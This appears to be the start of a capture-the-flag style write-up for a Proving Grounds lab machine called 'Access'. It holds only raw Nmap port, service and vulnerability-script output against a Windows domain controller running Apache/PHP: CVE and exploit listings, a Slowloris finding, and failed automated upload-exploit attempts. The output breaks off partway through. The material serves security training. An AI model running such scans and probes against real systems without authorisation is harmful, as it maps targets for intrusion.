## Nmap
```bash
┌──(kali㉿kali)-[~/PG/Access]
└─$ nnmap 192.168.193.187
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-01 09:16 +0900
Nmap scan report for 192.168.193.187
Host is up (0.067s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Access The Event
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-01 00:16:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| tls-alpn:
|_  http/1.1
| http-methods:
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
|_http-title: Access The Event
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49786/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=7/1%OT=53%CT=1%CU=44360%PV=Y%DS=4%DC=T%G=Y%TM=6A445CBB
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=10
OS:2%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%TS=U)S
OS:EQ(SP=107%GCD=1%ISR=108%TI=I%CI=I%TS=U)SEQ(SP=107%GCD=1%ISR=109%TI=I%CI=
OS:I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578N
OS:W8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-07-01T00:17:54
|_  start_date: N/A

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   67.18 ms 192.168.45.1
2   67.15 ms 192.168.45.254
3   67.25 ms 192.168.251.1
4   67.71 ms 192.168.193.187

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.99 seconds

```

## Nmap vuln
```bash
┌──(kali㉿kali)-[~/PG/Access]
└─$ sudo nmap -sVC -vvv 192.168.193.187 --script vuln
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-01 09:40 +0900
NSE: Loaded 152 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 09:40
Completed NSE at 09:40, 10.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 09:40
Completed NSE at 09:40, 0.00s elapsed
Initiating Ping Scan at 09:40
Scanning 192.168.193.187 [4 ports]
Completed Ping Scan at 09:40, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:40
Completed Parallel DNS resolution of 1 host. at 09:40, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 09:40
Scanning 192.168.193.187 [1000 ports]
Discovered open port 139/tcp on 192.168.193.187
Discovered open port 53/tcp on 192.168.193.187
Discovered open port 80/tcp on 192.168.193.187
Discovered open port 135/tcp on 192.168.193.187
Discovered open port 445/tcp on 192.168.193.187
Discovered open port 443/tcp on 192.168.193.187
Discovered open port 636/tcp on 192.168.193.187
Discovered open port 88/tcp on 192.168.193.187
Discovered open port 3268/tcp on 192.168.193.187
Discovered open port 389/tcp on 192.168.193.187
Discovered open port 5985/tcp on 192.168.193.187
Discovered open port 464/tcp on 192.168.193.187
Discovered open port 593/tcp on 192.168.193.187
Discovered open port 3269/tcp on 192.168.193.187
Completed SYN Stealth Scan at 09:40, 1.13s elapsed (1000 total ports)
Initiating Service scan at 09:40
Scanning 14 services on 192.168.193.187
Completed Service scan at 09:41, 12.40s elapsed (14 services on 1 host)
NSE: Script scanning 192.168.193.187.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 09:41
NSE Timing: About 99.23% done; ETC: 09:41 (0:00:00 remaining)
NSE Timing: About 99.39% done; ETC: 09:42 (0:00:00 remaining)
NSE Timing: About 99.39% done; ETC: 09:42 (0:00:01 remaining)
NSE Timing: About 99.39% done; ETC: 09:43 (0:00:01 remaining)
NSE Timing: About 99.56% done; ETC: 09:43 (0:00:01 remaining)
NSE Timing: About 99.56% done; ETC: 09:44 (0:00:01 remaining)
NSE Timing: About 99.56% done; ETC: 09:44 (0:00:01 remaining)
NSE Timing: About 99.56% done; ETC: 09:45 (0:00:01 remaining)
Stats: 0:04:55 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE: Active NSE Script Threads: 8 (7 waiting)
NSE Timing: About 99.56% done; ETC: 09:45 (0:00:01 remaining)
Stats: 0:04:55 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE: Active NSE Script Threads: 8 (7 waiting)
NSE Timing: About 99.56% done; ETC: 09:45 (0:00:01 remaining)
NSE Timing: About 99.56% done; ETC: 09:46 (0:00:01 remaining)
NSE Timing: About 99.89% done; ETC: 09:46 (0:00:00 remaining)
NSE Timing: About 99.89% done; ETC: 09:47 (0:00:00 remaining)
NSE Timing: About 99.89% done; ETC: 09:47 (0:00:00 remaining)
NSE Timing: About 99.89% done; ETC: 09:48 (0:00:00 remaining)
Completed NSE at 09:48, 444.27s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 09:48
NSE: [ssl-ccs-injection 192.168.193.187:636] No response from server: ERROR
NSE: [ssl-ccs-injection 192.168.193.187:3269] No response from server: ERROR
Completed NSE at 09:48, 2.96s elapsed
Nmap scan report for 192.168.193.187
Host is up, received syn-ack ttl 125 (0.070s latency).
Scanned at 2026-07-01 09:40:51 KST for 461s
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 125 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 125 Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.193.187
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://192.168.193.187:80/
|     Form id:
|     Form action: #
|
|     Path: http://192.168.193.187:80/
|     Form id: ticket-type
|     Form action: /Ticket.php
|
|     Path: http://192.168.193.187:80/
|     Form id: name
|     Form action: forms/contact.php
|
|     Path: http://192.168.193.187:80/index.html
|     Form id:
|     Form action: #
|
|     Path: http://192.168.193.187:80/index.html
|     Form id: ticket-type
|     Form action: /Ticket.php
|
|     Path: http://192.168.193.187:80/index.html
|     Form id: name
|_    Form action: forms/contact.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-fileupload-exploiter:
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|_    Failed to upload and execute a payload.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
| http-trace: TRACE is enabled
| Headers:
| Date: Wed, 01 Jul 2026 00:41:09 GMT
| Server: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| Connection: close
| Transfer-Encoding: chunked
|_Content-Type: message/http
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| vulners:
|   cpe:/a:apache:http_server:2.4.48:
|       PACKETSTORM:176334      9.8     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
|       PACKETSTORM:171631      9.8     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       HTTPD:C072933AA965A86DA3E2C9172FFC1569  9.8     https://vulners.com/httpd/HTTPD:C072933AA965A86DA3E2C9172FFC1569
|       HTTPD:A1BBCE110E077FFBF4469D4F06DB9293  9.8     https://vulners.com/httpd/HTTPD:A1BBCE110E077FFBF4469D4F06DB9293
|       HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D  9.8     https://vulners.com/httpd/HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D
|       HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8  9.8     https://vulners.com/httpd/HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8
|       HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E  9.8     https://vulners.com/httpd/HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E
|       EDB-ID:51193    9.8     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
|       D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52    9.8     https://vulners.com/githubexploit/D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52        *EXPLOIT*
|       CVE-2026-44631  9.8     https://vulners.com/cve/CVE-2026-44631
|       CVE-2026-29167  9.8     https://vulners.com/cve/CVE-2026-29167
|       CVE-2026-28780  9.8     https://vulners.com/cve/CVE-2026-28780
|       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
|       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
|       CVE-2023-25690  9.8     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-31813  9.8     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  9.8     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  9.8     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  9.8     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  9.8     https://vulners.com/cve/CVE-2021-39275
|       CNVD-2024-36391 9.8     https://vulners.com/cnvd/CNVD-2024-36391
|       CNVD-2024-36388 9.8     https://vulners.com/cnvd/CNVD-2024-36388
|       CNVD-2022-51061 9.8     https://vulners.com/cnvd/CNVD-2022-51061
|       CNVD-2022-41640 9.8     https://vulners.com/cnvd/CNVD-2022-41640
|       CNVD-2022-03225 9.8     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        9.8     https://vulners.com/cnvd/CNVD-2021-102386
|       64A540A8-D918-5BEA-8F60-987F97B27A0C    9.8     https://vulners.com/githubexploit/64A540A8-D918-5BEA-8F60-987F97B27A0C        *EXPLOIT*
|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    9.8     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9        *EXPLOIT*
|       3F17CA20-788F-5C45-88B3-E12DB2979B7B    9.8     https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B        *EXPLOIT*
|       1337DAY-ID-39214        9.8     https://vulners.com/zdt/1337DAY-ID-39214        *EXPLOIT*
|       1337DAY-ID-38427        9.8     https://vulners.com/zdt/1337DAY-ID-38427        *EXPLOIT*
|       PACKETSTORM:213257      9.1     https://vulners.com/packetstorm/PACKETSTORM:213257      *EXPLOIT*
|       HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6  9.1     https://vulners.com/httpd/HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6
|       HTTPD:2C227652EE0B3B961706AAFCACA3D1E1  9.1     https://vulners.com/httpd/HTTPD:2C227652EE0B3B961706AAFCACA3D1E1
|       FD2EE3A5-BAEA-5845-BA35-E6889992214F    9.1     https://vulners.com/githubexploit/FD2EE3A5-BAEA-5845-BA35-E6889992214F        *EXPLOIT*
|       FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7    9.1     https://vulners.com/githubexploit/FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7        *EXPLOIT*
|       E606D7F4-5FA2-5907-B30E-367D6FFECD89    9.1     https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89        *EXPLOIT*
|       D8A19443-2A37-5592-8955-F614504AAF45    9.1     https://vulners.com/githubexploit/D8A19443-2A37-5592-8955-F614504AAF45        *EXPLOIT*
|       CVE-2026-42535  9.1     https://vulners.com/cve/CVE-2026-42535
|       CVE-2025-23048  9.1     https://vulners.com/cve/CVE-2025-23048
|       CVE-2024-40898  9.1     https://vulners.com/cve/CVE-2024-40898
|       CVE-2024-38475  9.1     https://vulners.com/cve/CVE-2024-38475
|       CVE-2022-28615  9.1     https://vulners.com/cve/CVE-2022-28615
|       CVE-2022-22721  9.1     https://vulners.com/cve/CVE-2022-22721
|       CNVD-2025-16610 9.1     https://vulners.com/cnvd/CNVD-2025-16610
|       CNVD-2024-36387 9.1     https://vulners.com/cnvd/CNVD-2024-36387
|       CNVD-2024-33814 9.1     https://vulners.com/cnvd/CNVD-2024-33814
|       CNVD-2022-51060 9.1     https://vulners.com/cnvd/CNVD-2022-51060
|       CNVD-2022-41638 9.1     https://vulners.com/cnvd/CNVD-2022-41638
|       B5E74010-A082-5ECE-AB37-623A5B33FE7D    9.1     https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D        *EXPLOIT*
|       5418A85B-F4B7-5BBD-B106-0800AC961C7A    9.1     https://vulners.com/githubexploit/5418A85B-F4B7-5BBD-B106-0800AC961C7A        *EXPLOIT*
|       HTTPD:1B3D546A8500818AAC5B1359FE11A7E4  9.0     https://vulners.com/httpd/HTTPD:1B3D546A8500818AAC5B1359FE11A7E4
|       CVE-2022-36760  9.0     https://vulners.com/cve/CVE-2022-36760
|       CVE-2021-40438  9.0     https://vulners.com/cve/CVE-2021-40438
|       CNVD-2023-30860 9.0     https://vulners.com/cnvd/CNVD-2023-30860
|       CNVD-2022-03224 9.0     https://vulners.com/cnvd/CNVD-2022-03224
|       AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C    9.0     https://vulners.com/githubexploit/AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C        *EXPLOIT*
|       9D9B3F4D-6B5C-5377-BE39-F1C432C9E457    9.0     https://vulners.com/githubexploit/9D9B3F4D-6B5C-5377-BE39-F1C432C9E457        *EXPLOIT*
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    9.0     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2        *EXPLOIT*
|       7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2    9.0     https://vulners.com/githubexploit/7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2        *EXPLOIT*
|       36618CA8-9316-59CA-B748-82F15F407C4F    9.0     https://vulners.com/githubexploit/36618CA8-9316-59CA-B748-82F15F407C4F        *EXPLOIT*
|       CVE-2026-24072  8.8     https://vulners.com/cve/CVE-2026-24072
|       40379BCA-07F4-5401-B618-4640793D350D    8.8     https://vulners.com/githubexploit/40379BCA-07F4-5401-B618-4640793D350D        *EXPLOIT*
|       CVE-2025-58098  8.3     https://vulners.com/cve/CVE-2025-58098
|       HTTPD:A7133572D328CD65C350E33F20834FAD  8.2     https://vulners.com/httpd/HTTPD:A7133572D328CD65C350E33F20834FAD
|       CVE-2021-44224  8.2     https://vulners.com/cve/CVE-2021-44224
|       CNVD-2021-102387        8.2     https://vulners.com/cnvd/CNVD-2021-102387
|       B0A9E5E8-7CCC-5984-9922-A89F11D6BF38    8.2     https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38        *EXPLOIT*
|       CVE-2024-38473  8.1     https://vulners.com/cve/CVE-2024-38473
|       23079A70-8B37-56D2-9D37-F638EBF7F8B5    8.1     https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5        *EXPLOIT*
|       HTTPD:F6C47B71D440F1A5B8EC9883D1516A33  7.5     https://vulners.com/httpd/HTTPD:F6C47B71D440F1A5B8EC9883D1516A33
|       HTTPD:F1CFBC9B54DFAD0499179863D36830BB  7.5     https://vulners.com/httpd/HTTPD:F1CFBC9B54DFAD0499179863D36830BB
|       HTTPD:C317C7138B4A8BBD54A901D6DDDCB837  7.5     https://vulners.com/httpd/HTTPD:C317C7138B4A8BBD54A901D6DDDCB837
|       HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F  7.5     https://vulners.com/httpd/HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F
|       HTTPD:B1B0A31C4AD388CC6C575931414173E2  7.5     https://vulners.com/httpd/HTTPD:B1B0A31C4AD388CC6C575931414173E2
|       HTTPD:8D3D8562E77EAD24FA6850949D025BC9  7.5     https://vulners.com/httpd/HTTPD:8D3D8562E77EAD24FA6850949D025BC9
|       HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5  7.5     https://vulners.com/httpd/HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5
|       EDEE9204-2DB4-5931-983F-6C7DB7FD4FB7    7.5     https://vulners.com/githubexploit/EDEE9204-2DB4-5931-983F-6C7DB7FD4FB7        *EXPLOIT*
|       CVE-2026-49975  7.5     https://vulners.com/cve/CVE-2026-49975
|       CVE-2026-42536  7.5     https://vulners.com/cve/CVE-2026-42536
|       CVE-2026-34356  7.5     https://vulners.com/cve/CVE-2026-34356
|       CVE-2026-34355  7.5     https://vulners.com/cve/CVE-2026-34355
|       CVE-2026-34059  7.5     https://vulners.com/cve/CVE-2026-34059
|       CVE-2026-29169  7.5     https://vulners.com/cve/CVE-2026-29169
|       CVE-2025-59775  7.5     https://vulners.com/cve/CVE-2025-59775
|       CVE-2025-55753  7.5     https://vulners.com/cve/CVE-2025-55753
|       CVE-2025-53020  7.5     https://vulners.com/cve/CVE-2025-53020
|       CVE-2025-49630  7.5     https://vulners.com/cve/CVE-2025-49630
|       CVE-2024-47252  7.5     https://vulners.com/cve/CVE-2024-47252
|       CVE-2024-43394  7.5     https://vulners.com/cve/CVE-2024-43394
|       CVE-2024-43204  7.5     https://vulners.com/cve/CVE-2024-43204
|       CVE-2024-42516  7.5     https://vulners.com/cve/CVE-2024-42516
|       CVE-2024-39573  7.5     https://vulners.com/cve/CVE-2024-39573
|       CVE-2024-38477  7.5     https://vulners.com/cve/CVE-2024-38477
|       CVE-2024-38472  7.5     https://vulners.com/cve/CVE-2024-38472
|       CVE-2024-27316  7.5     https://vulners.com/cve/CVE-2024-27316
|       CVE-2023-31122  7.5     https://vulners.com/cve/CVE-2023-31122
|       CVE-2023-27522  7.5     https://vulners.com/cve/CVE-2023-27522
|       CVE-2022-30556  7.5     https://vulners.com/cve/CVE-2022-30556
|       CVE-2022-29404  7.5     https://vulners.com/cve/CVE-2022-29404
|       CVE-2022-26377  7.5     https://vulners.com/cve/CVE-2022-26377
|       CVE-2022-22719  7.5     https://vulners.com/cve/CVE-2022-22719
|       CVE-2021-36160  7.5     https://vulners.com/cve/CVE-2021-36160
|       CVE-2021-34798  7.5     https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-33193  7.5     https://vulners.com/cve/CVE-2021-33193
|       CVE-2006-20001  7.5     https://vulners.com/cve/CVE-2006-20001
|       CNVD-2025-30837 7.5     https://vulners.com/cnvd/CNVD-2025-30837
|       CNVD-2025-30836 7.5     https://vulners.com/cnvd/CNVD-2025-30836
|       CNVD-2025-16614 7.5     https://vulners.com/cnvd/CNVD-2025-16614
|       CNVD-2025-16613 7.5     https://vulners.com/cnvd/CNVD-2025-16613
|       CNVD-2025-16612 7.5     https://vulners.com/cnvd/CNVD-2025-16612
|       CNVD-2025-16609 7.5     https://vulners.com/cnvd/CNVD-2025-16609
|       CNVD-2025-16608 7.5     https://vulners.com/cnvd/CNVD-2025-16608
|       CNVD-2025-16603 7.5     https://vulners.com/cnvd/CNVD-2025-16603
|       CNVD-2024-36393 7.5     https://vulners.com/cnvd/CNVD-2024-36393
|       CNVD-2024-36390 7.5     https://vulners.com/cnvd/CNVD-2024-36390
|       CNVD-2024-36389 7.5     https://vulners.com/cnvd/CNVD-2024-36389
|       CNVD-2024-20839 7.5     https://vulners.com/cnvd/CNVD-2024-20839
|       CNVD-2023-93320 7.5     https://vulners.com/cnvd/CNVD-2023-93320
|       CNVD-2023-80558 7.5     https://vulners.com/cnvd/CNVD-2023-80558
|       CNVD-2022-53584 7.5     https://vulners.com/cnvd/CNVD-2022-53584
|       CNVD-2022-51058 7.5     https://vulners.com/cnvd/CNVD-2022-51058
|       CNVD-2022-41639 7.5     https://vulners.com/cnvd/CNVD-2022-41639
|       CNVD-2022-03223 7.5     https://vulners.com/cnvd/CNVD-2022-03223
|       CNVD-2022-03205 7.5     https://vulners.com/cnvd/CNVD-2022-03205
|       CDC791CD-A414-5ABE-A897-7CFA3C2D3D29    7.5     https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29        *EXPLOIT*
|       C2EB4AA1-0C70-5104-AF4C-BC274F5A5B7A    7.5     https://vulners.com/githubexploit/C2EB4AA1-0C70-5104-AF4C-BC274F5A5B7A        *EXPLOIT*
|       A5675239-3520-5F86-A975-8C0FBB77C2A9    7.5     https://vulners.com/githubexploit/A5675239-3520-5F86-A975-8C0FBB77C2A9        *EXPLOIT*
|       A0F268C8-7319-5637-82F7-8DAF72D14629    7.5     https://vulners.com/githubexploit/A0F268C8-7319-5637-82F7-8DAF72D14629        *EXPLOIT*
|       742112F7-4755-5E94-8DD2-899160B59E5E    7.5     https://vulners.com/githubexploit/742112F7-4755-5E94-8DD2-899160B59E5E        *EXPLOIT*
|       5B7082BE-022C-5DCA-BCDA-0F8EDD0E5085    7.5     https://vulners.com/githubexploit/5B7082BE-022C-5DCA-BCDA-0F8EDD0E5085        *EXPLOIT*
|       45D138AD-BEC6-552A-91EA-8816914CA7F4    7.5     https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4        *EXPLOIT*
|       0E08753E-C6D7-5E76-A61F-6CA6F7F87AA8    7.5     https://vulners.com/githubexploit/0E08753E-C6D7-5E76-A61F-6CA6F7F87AA8        *EXPLOIT*
|       CVE-2025-49812  7.4     https://vulners.com/cve/CVE-2025-49812
|       CVE-2026-44186  7.3     https://vulners.com/cve/CVE-2026-44186
|       CVE-2026-44185  7.3     https://vulners.com/cve/CVE-2026-44185
|       CVE-2026-29168  7.3     https://vulners.com/cve/CVE-2026-29168
|       CVE-2023-38709  7.3     https://vulners.com/cve/CVE-2023-38709
|       CNVD-2024-36395 7.3     https://vulners.com/cnvd/CNVD-2024-36395
|       CVE-2026-43951  6.5     https://vulners.com/cve/CVE-2026-43951
|       CVE-2026-33523  6.5     https://vulners.com/cve/CVE-2026-33523
|       CVE-2025-65082  6.5     https://vulners.com/cve/CVE-2025-65082
|       CNVD-2025-30833 6.5     https://vulners.com/cnvd/CNVD-2025-30833
|       CVE-2024-24795  6.3     https://vulners.com/cve/CVE-2024-24795
|       CNVD-2024-36394 6.3     https://vulners.com/cnvd/CNVD-2024-36394
|       CVE-2026-29170  6.1     https://vulners.com/cve/CVE-2026-29170
|       CVE-2023-45802  5.9     https://vulners.com/cve/CVE-2023-45802
|       556687CB-7B66-53C5-A79C-84B0ED753C7E    5.9     https://vulners.com/githubexploit/556687CB-7B66-53C5-A79C-84B0ED753C7E        *EXPLOIT*
|       CVE-2026-44119  5.5     https://vulners.com/cve/CVE-2026-44119
|       CVE-2025-66200  5.4     https://vulners.com/cve/CVE-2025-66200
|       CNVD-2025-30835 5.4     https://vulners.com/cnvd/CNVD-2025-30835
|       HTTPD:BAAB4065D254D64A717E8A5C847C7BCA  5.3     https://vulners.com/httpd/HTTPD:BAAB4065D254D64A717E8A5C847C7BCA
|       HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F  5.3     https://vulners.com/httpd/HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F
|       CVE-2026-34032  5.3     https://vulners.com/cve/CVE-2026-34032
|       CVE-2026-33857  5.3     https://vulners.com/cve/CVE-2026-33857
|       CVE-2026-33007  5.3     https://vulners.com/cve/CVE-2026-33007
|       CVE-2022-37436  5.3     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-28614  5.3     https://vulners.com/cve/CVE-2022-28614
|       CVE-2022-28330  5.3     https://vulners.com/cve/CVE-2022-28330
|       CNVD-2023-30859 5.3     https://vulners.com/cnvd/CNVD-2023-30859
|       CNVD-2022-53582 5.3     https://vulners.com/cnvd/CNVD-2022-53582
|       CNVD-2022-51059 5.3     https://vulners.com/cnvd/CNVD-2022-51059
|       EA6ADD14-D80B-5DC2-9991-1F9663E2D09F    4.8     https://vulners.com/githubexploit/EA6ADD14-D80B-5DC2-9991-1F9663E2D09F        *EXPLOIT*
|       CVE-2026-33006  4.8     https://vulners.com/cve/CVE-2026-33006
|_      74A7BA4E-D496-587B-A72A-FA0BE663F994    0.0     https://vulners.com/githubexploit/74A7BA4E-D496-587B-A72A-FA0BE663F994        *EXPLOIT*
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-enum:
|   /forms/: Potentially interesting directory w/ listing on 'apache/2.4.48 (win64) openssl/1.1.1k php/8.0.7'
|   /icons/: Potentially interesting folder w/ directory listing
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.48 (win64) openssl/1.1.1k php/8.0.7'
88/tcp   open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2026-07-01 00:40:58Z)
135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
443/tcp  open  ssl/http      syn-ack ttl 125 Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| http-trace: TRACE is enabled
| Headers:
| Date: Wed, 01 Jul 2026 00:41:06 GMT
| Server: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| Connection: close
| Transfer-Encoding: chunked
|_Content-Type: message/http
| http-fileupload-exploiter:
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
